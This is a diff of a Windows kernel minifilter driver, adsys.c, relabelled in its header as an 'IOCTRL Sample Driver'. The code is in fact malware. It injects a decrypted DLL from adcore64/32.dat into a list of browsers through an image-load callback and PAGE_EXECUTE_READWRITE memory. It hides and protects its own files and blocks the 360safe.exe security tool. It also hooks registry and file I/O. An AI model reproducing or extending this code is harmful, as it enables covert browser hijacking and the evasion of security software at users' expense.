@@ -1,171 +1,323 @@
-/*++
+/***************************************************************************************
+* AUTHOR : antireg
+* DATE   : 2019-6-21
+* MODULE : adsys.C
+* 
+* Command: 
+*	Source of IOCTRL Sample Driver
+*
+* Description:
+*		Demonstrates communications between USER and KERNEL.
+*
+****************************************************************************************
+* Copyright (C) 2010 antireg.
+****************************************************************************************/
 
-Copyright (c) 1999 - 2002  Microsoft Corporation
+//#######################################################################################
+//# I N C L U D E S
+//#######################################################################################
 
-Module Name:
-
-    adsys.c
-
-Abstract:
-
-    This is the main module of the nullFilter mini filter driver.
-    It is a simple minifilter that registers itself with the main filter
-    for no callback operations.
-
-Environment:
-
-    Kernel mode
-
---*/
-
+#ifndef CXX_ADSYS_H
 #include <fltKernel.h>
-#include <dontuse.h>
-#include <suppress.h>
-#include <string.h>
 #include "adsys.h"
-#include <ntstrsafe.h>
-#include <strsafe.h>
-#pragma prefast(disable:__WARNING_ENCODE_MEMBER_FUNCTION_POINTER, "Not valid for kernel mode drivers")
+#endif
 
-//---------------------------------------------------------------------------
-//      Global variables
-//---------------------------------------------------------------------------
+//#include "struct.h"
 
+//////////////////////////////////////////////////////////////////////////
 
-//
-//  Assign text sections for each routine.
-//
 
 #ifdef ALLOC_PRAGMA
-
+    // Allow the DriverEntry routine to be discarded once initialization is completed
+#pragma alloc_text(INIT, DriverEntry)
+    // 
+#pragma alloc_text(PAGE, DriverUnload)
+#pragma alloc_text(PAGE, DispatchCreate)
+#pragma alloc_text(PAGE, DispatchClose)
+#pragma alloc_text(PAGE, DispatchDeviceControl)
+#pragma alloc_text(PAGE, DispatchCommon)
 #pragma alloc_text(PAGE, InstanceSetup)
 #pragma alloc_text(PAGE, CleanVolumCtx)
 #pragma alloc_text(PAGE, InstanceQueryTeardown)
-#pragma alloc_text(INIT, DriverEntry)
 #pragma alloc_text(PAGE, FilterUnload)
-#endif
-/***********************
-    Filter initialization and unload routines.
-*************************************************************************/
 
+ 
+ 
+#endif // ALLOC_PRAGMA
 
-NTSTATUS DriverEntry (
-    __in PDRIVER_OBJECT DriverObject,
-    __in PUNICODE_STRING RegistryPath
-)
+NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryString)
 {
-    NTSTATUS status=-1;
+	NTSTATUS		status = STATUS_SUCCESS;
+
     PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
     PVOID pFoundPattern = NULL;
     UCHAR PreviousModePattern[] = "\x00\x00\xC3";
-    LIST_ENTRY list_head;
-    PLIST_ENTRY p=NULL;
     PKLDR_DATA_TABLE_ENTRY entry=NULL;
-    int it;
     PMY_COMMAND_INFO  p1=NULL;
-    WCHAR  a[]=L"hehee";
-    UNREFERENCED_PARAMETER( RegistryPath );
-    DriverObject->DriverUnload = DriverUnload;
 
-    g_drobj=DriverObject;
+	
+	UNICODE_STRING  ustrLinkName;
+	UNICODE_STRING  ustrDevName;  
+	PDEVICE_OBJECT  pDevObj;
+	int i = 0;
+	pDriverObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
+	pDriverObj->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
 
-    //  Register with FltMgr
+	// Dispatch routine for communications
+	pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;
 
+	// Unload routine
+	pDriverObj->DriverUnload = DriverUnload;
+
+	// Initialize the device name.
+	RtlInitUnicodeString(&ustrDevName, NT_DEVICE_NAME);
+
+	// Create the device object and device extension
+	status = IoCreateDevice(pDriverObj, 0,&ustrDevName, FILE_DEVICE_UNKNOWN,0,FALSE,&pDevObj);
+	if(!NT_SUCCESS(status))
+	{
+		dprintf("[DriverEntry] Error, IoCreateDevice = 0x%x\r\n", status);
+		return status;
+	}
+
+    //// Get a pointer to our device extension
+    //deviceExtension = (PDEVICE_EXTENSION) deviceObject->DeviceExtension;
+
+    //// Save a pointer to the device object
+    //deviceExtension->DeviceObject = deviceObject;
+
+	if(IoIsWdmVersionAvailable(1,0x10))
+	{
+		//如果是支持符号链接用户相关性的系统
+		RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_GLOBAL_NAME);
+	}
+	else
+	{
+		//不支持
+		RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_NAME);
+	}
+	
+	// Create a symbolic link to allow USER applications to access it. 
+	status = IoCreateSymbolicLink(&ustrLinkName, &ustrDevName);  
+	
+	if(!NT_SUCCESS(status))
+	{
+		dprintf("Error, IoCreateSymbolicLink = 0x%x\r\n", status);
+		
+		IoDeleteDevice(pDevObj); 
+		return status;
+	}	
+
+	//
+	//	TODO: Add initialization code here.
+	//
 //浏览器
-    InitializeListHead(&g_ListProcess);
 
-
-    AppendListNode(L"360se.exe",&g_ListProcess,0);
-    AppendListNode(L"chrome.exe",&g_ListProcess,0);
-    AppendListNode(L"QQBrowser.exe",&g_ListProcess,0);
-    AppendListNode(L"2345Explorer.exe",&g_ListProcess,0);
-    AppendListNode(L"SogouExplorer.exe",&g_ListProcess,0);
-    AppendListNode(L"baidubrowser.exe",&g_ListProcess,0);
-    AppendListNode(L"firefox.exe",&g_ListProcess,0);
-    AppendListNode(L"UCBrowser.exe",&g_ListProcess,0);
-    AppendListNode(L"liebao.exe",&g_ListProcess,0);
-    AppendListNode(L"TheWorld.exe",&g_ListProcess,0);
-    AppendListNode(L"iexplore.exe",&g_ListProcess,0);
-    AppendListNode(L"360chrome.exe",&g_ListProcess,0);
-    AppendListNode(L"opera.exe",&g_ListProcess,0);
-    AppendListNode(L"Maxthon.exe",&g_ListProcess,0);
+   InitializeListHead(&g_ListProcess);
+   AppendListNode(L"360se.exe",&g_ListProcess,0);
+   AppendListNode(L"chrome.exe",&g_ListProcess,0);
+   AppendListNode(L"QQBrowser.exe",&g_ListProcess,0);
+   AppendListNode(L"2345Explorer.exe",&g_ListProcess,0);
+   AppendListNode(L"SogouExplorer.exe",&g_ListProcess,0);
+   AppendListNode(L"baidubrowser.exe",&g_ListProcess,0);
+   AppendListNode(L"firefox.exe",&g_ListProcess,0);
+   AppendListNode(L"UCBrowser.exe",&g_ListProcess,0);
+   AppendListNode(L"liebao.exe",&g_ListProcess,0);
+   AppendListNode(L"TheWorld.exe",&g_ListProcess,0);
+   AppendListNode(L"iexplore.exe",&g_ListProcess,0);
+   AppendListNode(L"360chrome.exe",&g_ListProcess,0);
+   AppendListNode(L"opera.exe",&g_ListProcess,0);
+   AppendListNode(L"Maxthon.exe",&g_ListProcess,0);
 
 //要保护的文件
-    InitializeListHead(&g_ProtectFile);
-    KeInitializeSpinLock(&g_spin_lockfile);
+   InitializeListHead(&g_ProtectFile);
+   KeInitializeSpinLock(&g_spin_lockfile);
 
-    AppendListNode(L"adplug.dll",&g_ProtectFile,2);
-    AppendListNode(L"adsys.sys",&g_ProtectFile,1);
+   AppendListNode(L"adplug.dll",&g_ProtectFile,2);
+   AppendListNode(L"adsys.sys",&g_ProtectFile,1);
 
 
 //不让访问的进程名
-    InitializeListHead(&g_AntiProcess);
-    KeInitializeSpinLock(&g_spin_process);
-    AppendListNode(L"360safe.exe",&g_AntiProcess,0);
-
-
-//  kprintf("find:%d",FindInList(L"360se.exe",&g_AntiProcess));
-
+   InitializeListHead(&g_AntiProcess);
+   KeInitializeSpinLock(&g_spin_process);
+   AppendListNode(L"360safe.exe",&g_AntiProcess,0);
 #ifdef _AMD64_
-    //x64 add code
-    status = MzReadFile(L"\\??\\C:\\adcore64.dat",&g_pDll64,&g_iDll64);
-    if (NT_SUCCESS(status)) {
-        MyDecryptFile(g_pDll64,g_iDll64);
+   //x64 add code
+   status = MzReadFile(L"\\??\\C:\\Windows\\adcore64.dat",&g_pDll64,&g_iDll64);
+   if (NT_SUCCESS(status)) {
+       MyDecryptFile(g_pDll64,g_iDll64);
 
-    }
+   }
 
-    status = MzReadFile(L"\\??\\C:\\adcore32.dat",&g_pDll32,&g_iDll32);
-    if (NT_SUCCESS(status)) {
-        MyDecryptFile(g_pDll32,g_iDll32);
-    }
+   status = MzReadFile(L"\\??\\C:\\Windows\\adcore32.dat",&g_pDll32,&g_iDll32);
+   if (NT_SUCCESS(status)) {
+       MyDecryptFile(g_pDll32,g_iDll32);
+   }
 
 #else
-    //x86 add code
-    status = MzReadFile(L"\\??\\C:\\adcore32.dat",&g_pDll32,&g_iDll32);
-    if (NT_SUCCESS(status)) {
-        MyDecryptFile(g_pDll32,g_iDll32);
-    }
+   //x86 add code
+   status = MzReadFile(L"\\??\\C:\\Windows\\adcore32.dat",&g_pDll32,&g_iDll32);
+   if (NT_SUCCESS(status)) {
+       MyDecryptFile(g_pDll32,g_iDll32);
+   }
 #endif
 
-    kprintf("[DriverEntry] g_pDll64:%p g_iDll64:%x g_pDll32:%p g_iDll32:%x",g_pDll64,g_iDll64,g_pDll32,g_iDll32);
+   kprintf("[DriverEntry] g_pDll64:%p g_iDll64:%x g_pDll32:%p g_iDll32:%x",g_pDll64,g_iDll64,g_pDll32,g_iDll32);
 
 #ifdef _AMD64_
-    KeServiceDescriptorTable = (PServiceDescriptorTableEntry_t)GetKeServiceDescriptorTable64();
+   KeServiceDescriptorTable = (PServiceDescriptorTableEntry_t)GetKeServiceDescriptorTable64();
 #else
 #endif
 
-    kprintf("[DriverEntry] KeServiceDescriptorTable:%p", KeServiceDescriptorTable);
+   kprintf("[DriverEntry] KeServiceDescriptorTable:%p", KeServiceDescriptorTable);
 
-    PsGetProcessWow64Process = (P_PsGetProcessWow64Process)GetSystemRoutineAddress(L"PsGetProcessWow64Process");
-    PsGetProcessPeb = (P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb");
-    DbgPrint("[DriverEntry] PsGetProcessPeb:%p   PsGetProcessWow64Process:%p", PsGetProcessPeb, PsGetProcessWow64Process);
-    if(NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern))) {
-        g_mode = *(PULONG)((PUCHAR)pFoundPattern - 2);
-        kprintf("[DriverEntry] g_mode:%x fnExGetPreviousMode:%p\n", g_mode, fnExGetPreviousMode);
-    }
-//    status = PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
-//    if(!NT_SUCCESS(status)) {
-//        kprintf("[DriverEntry] PsSetLoadImageNotifyRoutine Failed! status:%x\n", status);
-//    }
+   PsGetProcessWow64Process = (P_PsGetProcessWow64Process)GetSystemRoutineAddress(L"PsGetProcessWow64Process");
+   PsGetProcessPeb = (P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb");
+   DbgPrint("[DriverEntry] PsGetProcessPeb:%p   PsGetProcessWow64Process:%p", PsGetProcessPeb, PsGetProcessWow64Process);
+   if(NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern))) {
+       g_mode = *(PULONG)((PUCHAR)pFoundPattern - 2);
+       kprintf("[DriverEntry] g_mode:%x fnExGetPreviousMode:%p\n", g_mode, fnExGetPreviousMode);
+   }
 
-    //注册表回调监控
-    SetRegisterCallback();
-    //文件回调监控
-    ExInitializeNPagedLookasideList( &Pre2PostContextList,NULL,NULL,0,sizeof(PRE_2_POST_CONTEXT),PRE_2_POST_TAG,0 );
-    status = FltRegisterFilter( DriverObject,&FilterRegistration,&gFilterHandle);
-    ASSERT( NT_SUCCESS( status ) );
-    if (NT_SUCCESS( status )) {
-        //
-        //  Start filtering i/o
-        //
-        status = FltStartFiltering( gFilterHandle);
-        if (!NT_SUCCESS( status )) {
-            FltUnregisterFilter( gFilterHandle);
-        }
-    }
 
-    return status;
+	// 映像加载回调
+	
+   status = PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
+   if(!NT_SUCCESS(status)) {
+       kprintf("[DriverEntry] PsSetLoadImageNotifyRoutine Failed! status:%x\n", status);
+   }
+
+   //注册表回调监控
+   SetRegisterCallback();
+   //文件回调监控
+   ExInitializeNPagedLookasideList( &Pre2PostContextList,NULL,NULL,0,sizeof(PRE_2_POST_CONTEXT),PRE_2_POST_TAG,0 );
+   status = FltRegisterFilter( pDriverObj,&FilterRegistration,&gFilterHandle);
+   ASSERT( NT_SUCCESS( status ) );
+   if (NT_SUCCESS( status )) {
+       //
+       //  Start filtering i/o
+       //
+       status = FltStartFiltering( gFilterHandle);
+       if (!NT_SUCCESS( status )) {
+           FltUnregisterFilter( gFilterHandle);
+       }
+   }
+	return STATUS_SUCCESS;
 }
+
+VOID DriverUnload(IN PDRIVER_OBJECT pDriverObj)
+{	
+	UNICODE_STRING strLink;
+
+	// Unloading - no resources to free so just return.
+	dprintf("Unloading...\r\n");;	
+
+	//
+	// TODO: Add uninstall code here.
+	//
+	PsRemoveLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
+    RemoveRegisterCallback();
+	// Delete the symbolic link
+	RtlInitUnicodeString(&strLink, SYMBOLIC_LINK_NAME);
+	IoDeleteSymbolicLink(&strLink);
+
+	// Delete the DeviceObject
+	IoDeleteDevice(pDriverObj->DeviceObject);
+
+	dprintf("Unloaded Success\r\n");
+
+	return;
+}
+
+NTSTATUS DispatchCreate(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
+{
+	pIrp->IoStatus.Status = STATUS_SUCCESS;
+	pIrp->IoStatus.Information = 0;
+
+	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
+
+	return STATUS_SUCCESS;
+}
+
+
+NTSTATUS DispatchClose(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
+{
+	pIrp->IoStatus.Status = STATUS_SUCCESS;
+	pIrp->IoStatus.Information = 0;
+
+	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
+
+	// Return success
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS DispatchCommon(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
+{
+	pIrp->IoStatus.Status = STATUS_SUCCESS;
+	pIrp->IoStatus.Information = 0L;
+	IoCompleteRequest( pIrp, 0 );
+	// Return success
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT pDevObj, IN PIRP pIrp)
+{
+	NTSTATUS status               = STATUS_INVALID_DEVICE_REQUEST;	 // STATUS_UNSUCCESSFUL
+	PIO_STACK_LOCATION pIrpStack  = IoGetCurrentIrpStackLocation(pIrp);
+	ULONG uIoControlCode          = 0;
+	PVOID pIoBuffer				  = NULL;
+	ULONG uInSize                 = 0;
+	ULONG uOutSize                = 0;
+
+	// Get the IoCtrl Code
+	uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
+	pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;
+	uInSize = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
+	uOutSize = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;
+
+	switch(uIoControlCode)
+	{
+		case IOCTL_HELLO_WORLD:
+			{			
+				dprintf("MY_CTL_CODE(0)=%d\r\n,MY_CTL_CODE");
+
+				// Return success
+				status = STATUS_SUCCESS;
+			}
+			break;
+			
+		//
+		// TODO: Add execute code here.
+		//
+		default:
+			{
+
+				status = STATUS_INVALID_PARAMETER;	
+			}
+			break;
+	}
+
+	if(status == STATUS_SUCCESS)
+	{
+		pIrp->IoStatus.Information = uOutSize;
+	}
+	else
+	{
+		pIrp->IoStatus.Information = 0;
+	}
+
+	// Complete the I/O Request
+	pIrp->IoStatus.Status = status;
+	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
+	return status;
+}
+
+
+//
+// TODO: Add your module definitions here.
+//
+
+
 
 NTSTATUS FilterUnload (__in FLT_FILTER_UNLOAD_FLAGS Flags)
 {
@@ -981,14 +1133,14 @@ FLT_PREOP_CALLBACK_STATUS PreRead(
         p2pCtx = ExAllocateFromNPagedLookasideList( &Pre2PostContextList );
 
         if (p2pCtx == NULL) {
-            kprintf("[PreRead]:%wZ Failed to allocate pre2Post context structure\n",&volCtx->Name);
+//            kprintf("[PreRead]:%wZ Failed to allocate pre2Post context structure\n",&volCtx->Name);
             leave;
         }
         //
         //  Update the buffer pointers and MDL address, mark we have changed
         //  something.
         //
-        DbgPrint("[PreRead]  p2pCtx:%p newBuf:%p newMdl:%p",p2pCtx,newBuf,newMdl);
+//        DbgPrint("[PreRead]  p2pCtx:%p newBuf:%p newMdl:%p",p2pCtx,newBuf,newMdl);
         iopb->Parameters.Read.ReadBuffer = newBuf;
         iopb->Parameters.Read.MdlAddress = newMdl;
         FltSetCallbackDataDirty( Data );
@@ -1062,12 +1214,6 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
             leave;
         }
 
-
-        DbgPrint("[PostRead] p2pCtx:%p  SwappedBuffer%p",p2pCtx,p2pCtx->SwappedBuffer);
-
-
-
-
         //
         //  We need to copy the read data back into the users buffer.  Note
         //  that the parameters passed in are for the users original buffers
@@ -1082,39 +1228,30 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
                 Data->IoStatus.Information = 0;
                 leave;
             }
-            DbgPrint("[PostRead] MmGetSystemAddressForMdlSafe MdlAddress:%p origBuf:%p",iopb->Parameters.Read.MdlAddress,origBuf);
+//            DbgPrint("[PostRead] MmGetSystemAddressForMdlSafe MdlAddress:%p origBuf:%p",iopb->Parameters.Read.MdlAddress,origBuf);
 
         } else if (FlagOn(Data->Flags,FLTFL_CALLBACK_DATA_SYSTEM_BUFFER) ||FlagOn(Data->Flags,FLTFL_CALLBACK_DATA_FAST_IO_OPERATION)) {
             origBuf = iopb->Parameters.Read.ReadBuffer;
-            DbgPrint("[PostRead] FLTFL_CALLBACK_DATA_SYSTEM_BUFFER|FLTFL_CALLBACK_DATA_FAST_IO_OPERATION system buffer origBuf:%p",origBuf);
+//            DbgPrint("[PostRead] FLTFL_CALLBACK_DATA_SYSTEM_BUFFER|FLTFL_CALLBACK_DATA_FAST_IO_OPERATION system buffer origBuf:%p",origBuf);
 
             //DbgPrint("SwapBuffers! origBuf:%p",origBuf);
 
         } else {
 
 
-            DbgPrint("[PostRead] call FltDoCompletionProcessingWhenSafe");
+//            DbgPrint("[PostRead] call FltDoCompletionProcessingWhenSafe");
 
             //DbgPrint("FltDoCompletionProcessingWhenSafe come on here");
-            if (FltDoCompletionProcessingWhenSafe( Data,
-                                                   FltObjects,
-                                                   CompletionContext,
-                                                   Flags,
-                                                   PostReadWhenSafe,
-                                                   &retValue )) {
+            if (FltDoCompletionProcessingWhenSafe(Data,FltObjects,CompletionContext,Flags,PostReadWhenSafe,&retValue )) {
 
                 //
                 //  This operation has been moved to a safe IRQL, the called
                 //  routine will do (or has done) the freeing so don't do it
                 //  in our routine.
                 //
-
                 cleanupAllocatedBuffer = FALSE;
-
             } else {
-
-                DbgPrint("[PostRead] call else");
-
+//                DbgPrint("[PostRead] call else");
                 Data->IoStatus.Status = STATUS_UNSUCCESSFUL;
                 Data->IoStatus.Information = 0;
             }
@@ -1141,7 +1278,7 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
                 if(p2pCtx->pStreamCtx->uEncrypteType==1) {
                     PUCHAR  puorigin=(PUCHAR)origBuf;
                     ULONG i=0;
-                    kprintf("[PostRead] encrypte len file:%d",Data->IoStatus.Information);
+//                    kprintf("[PostRead] encrypte len file:%d",Data->IoStatus.Information);
                     for(i=0; i<Data->IoStatus.Information; i++) {
                         PUCHAR pByte=(PUCHAR)p2pCtx->SwappedBuffer;
                         puorigin[i]=pByte[i]^0xa;
@@ -1154,7 +1291,7 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
                     } else {
                         PUCHAR  puorigin=(PUCHAR)origBuf;
                         ULONG i=0;
-                        kprintf("[PostRead] encrypte len file:%d",Data->IoStatus.Information);
+//                        kprintf("[PostRead] encrypte len file:%d",Data->IoStatus.Information);
                         for(i=0; i<Data->IoStatus.Information; i++) {
                             PUCHAR pByte=(PUCHAR)p2pCtx->SwappedBuffer;
                             puorigin[i]=pByte[i]^0xa;
@@ -1169,7 +1306,7 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
         }
         __except(EXCEPTION_EXECUTE_HANDLER) {
             ULONG code= GetExceptionCode();
-            DbgPrint("GetExceptionCode code:%x",code);
+//            DbgPrint("GetExceptionCode code:%x",code);
         }
 
 
@@ -1182,7 +1319,7 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
         //  the volume context.  The freeing of the MDL (if there is one) is
         //  handled by FltMgr.
         //
-        DbgPrint("[PostRead] finally cleanupAllocatedBuffer:%d",cleanupAllocatedBuffer);
+//        DbgPrint("[PostRead] finally cleanupAllocatedBuffer:%d",cleanupAllocatedBuffer);
         if (cleanupAllocatedBuffer)
         {
 
@@ -1219,14 +1356,7 @@ FLT_POSTOP_CALLBACK_STATUS PostReadWhenSafe (IN OUT PFLT_CALLBACK_DATA Data,IN P
     UNREFERENCED_PARAMETER( FltObjects );
     UNREFERENCED_PARAMETER( Flags );
     ASSERT(Data->IoStatus.Information != 0);
-    kprintf("[PostReadWhenSafe] ......");
-    //
-    //  This is some sort of user buffer without a MDL, lock the user buffer
-    //  so we can access it.  This will create a MDL for it.
-    //
-
     status = FltLockUserBuffer( Data );
-
     if (!NT_SUCCESS(status)) {
 
         //
@@ -1274,7 +1404,7 @@ DWORD_PTR GetSystemRoutineAddress(WCHAR *szFunCtionAName)
 
 
 /** 
- * [RegisterMonCallback description]
+ * [RegCallBack description]
  * @Author   zzc
  * @DateTime 2019年6月18日T6:53:38+0800
  * @param    CallbackContext          [上下文]
@@ -1282,7 +1412,7 @@ DWORD_PTR GetSystemRoutineAddress(WCHAR *szFunCtionAName)
  * @param    Argument2                [操作详细信息的结构体指针]
  * @return                            [状态值]
  */
-NTSTATUS RegisterMonCallback(PVOID CallbackContext,PVOID Argument1,PVOID Argument2)
+NTSTATUS RegCallBack(PVOID CallbackContext,PVOID Argument1,PVOID Argument2)
 {
     NTSTATUS status = STATUS_SUCCESS;
     UNICODE_STRING ustrRegPath = { 0 };
@@ -1395,7 +1525,7 @@ NTSTATUS RegisterMonCallback(PVOID CallbackContext,PVOID Argument1,PVOID Argumen
 
 NTSTATUS SetRegisterCallback()
 {
-    NTSTATUS status = CmRegisterCallback(RegisterMonCallback, NULL, &g_liRegCookie);
+    NTSTATUS status = CmRegisterCallback(RegCallBack, NULL, &g_liRegCookie);
 
     if (!NT_SUCCESS(status)) {
         DbgPrint("CmRegisterCallback", status);
@@ -1406,19 +1536,6 @@ NTSTATUS SetRegisterCallback()
     return status;
 }
 
-VOID DriverUnload(IN PDRIVER_OBJECT pDriverObj)
-{
-
-    UNICODE_STRING strLink = { 0 };
-    // Unloading - no resources to free so just return.
-    UNREFERENCED_PARAMETER(pDriverObj);
-
-    // TODO: Add uninstall code here.
-//    PsRemoveLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
-    RemoveRegisterCallback();
-    DbgPrint("[DriverUnload] Unloaded Success\r\n");
-    return;
-}
 
 // 删除回调函数
 VOID RemoveRegisterCallback()
@@ -1666,6 +1783,8 @@ VOID ImageNotify(PUNICODE_STRING       FullImageName, HANDLE ProcessId, PIMAGE_I
     WCHAR      pTempBuf[ 512 ] = { 0 };
     WCHAR      exename[216] = {0};
     int i = 0;
+	BOOLEAN  bGet=FALSE;
+	PMY_COMMAND_INFO  pCMDData=NULL;
 
     if (ProcessId==0) {
         //DbgPrint("ProcessId：%x FullImageName:%wZ  ",ProcessId,FullImageName);
@@ -1691,25 +1810,44 @@ VOID ImageNotify(PUNICODE_STRING       FullImageName, HANDLE ProcessId, PIMAGE_I
 #ifdef _AMD64_
         //x64 add code
         pPEB=PsGetProcessWow64Process(ProcessObj);
-        if(wcsstr(pTempBuf,L"\\syswow64\\")!=NULL) {
-            BOOLEAN  bfind = GetProcessNameByObj(ProcessObj, exename);
-            if(bfind == TRUE && IsByInjectProc(exename)) {
-                InjectDll(ProcessObj, 32);
-            }
+        if(wcsstr(pTempBuf,L"\\syswow64\\")!=NULL) {		
+			bGet = GetProcessNameByObj(ProcessObj,exename);
+			if (bGet&&_wcsicmp(exename,L"")!=NULL) {
+				pCMDData= FindInList(exename,&g_ListProcess,&g_spin_browser);
+				if (pCMDData)
+					{
+						 InjectDll(ProcessObj,32);
+					}
+			   
+			}
+
         } else {
             if(pPEB==NULL) {
                 pPEB=PsGetProcessPeb(ProcessObj);
-                if (GetProcessNameByObj(ProcessObj,exename)&&IsByInjectProc(exename)) {
-                    InjectDll(ProcessObj,32);
+				bGet = GetProcessNameByObj(ProcessObj,exename);
+                if (bGet&&_wcsicmp(exename,L"")!=NULL) {
+					pCMDData= FindInList(exename,&g_ListProcess,&g_spin_browser);
+					if (pCMDData)
+						{
+							 InjectDll(ProcessObj,64);
+						}
+                   
                 }
             }
         }
 #else
         //x86 add code
         pPEB=PsGetProcessPeb(ProcessObj);
-        if (GetProcessNameByObj(ProcessObj,exename)&&IsByInjectProc(exename)) {
-            newWorkItem(32);
-        }
+
+		bGet = GetProcessNameByObj(ProcessObj,exename);
+		if (bGet&&_wcsicmp(exename,L"")!=NULL) {
+			pCMDData= FindInList(exename,&g_ListProcess,&g_spin_browser);
+			if (pCMDData)
+				{
+					 newWorkItem(32);
+				}
+		   
+		}
 
 #endif
 
@@ -1798,6 +1936,8 @@ void InjectDll(PEPROCESS ProcessObj, int ibit)
             kprintf("[InjectDll] ObOpenObjectByPointer status:%x", status);
             return;
         }
+
+		if (sizeDll==0) return;
 
 
         status = ZwAllocateVirtualMemory(ProcessHandle, &dllbase, ZeroBits, &sizeDll, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -1999,7 +2139,6 @@ void MyDecryptFile(PVOID pdata, int len)
     }
 }
 
-
 void  newWorkItem(ULONG bit)
 {
     PIO_WORKITEM pIoWorkItem;
@@ -2018,7 +2157,6 @@ void  newWorkItem(ULONG bit)
 
 }
 
-
 VOID WorkerItemRoutine(PDEVICE_OBJECT  DeviceObject, PVOID  Context, PIO_WORKITEM IoWorkItem)
 {
     NTSTATUS                    status;
@@ -2035,14 +2173,13 @@ VOID WorkerItemRoutine(PDEVICE_OBJECT  DeviceObject, PVOID  Context, PIO_WORKITE
             ObfDereferenceObject(ProcessObj);
         }
 
-        kfree(pParam);
+        kfree(pParam); 
     }
     IoUninitializeWorkItem(IoWorkItem);
     IoFreeWorkItem(IoWorkItem);
 
 
 }
-
 
 void  InitGlobeFunc(PIMAGE_INFO     ImageInfo )
 {
@@ -2106,4 +2243,6 @@ PMY_COMMAND_INFO  FindInList(const WCHAR* name,LIST_ENTRY*     link,PKSPIN_LOCK 
     return pData;
 
 }
+
+/* EOF */
 
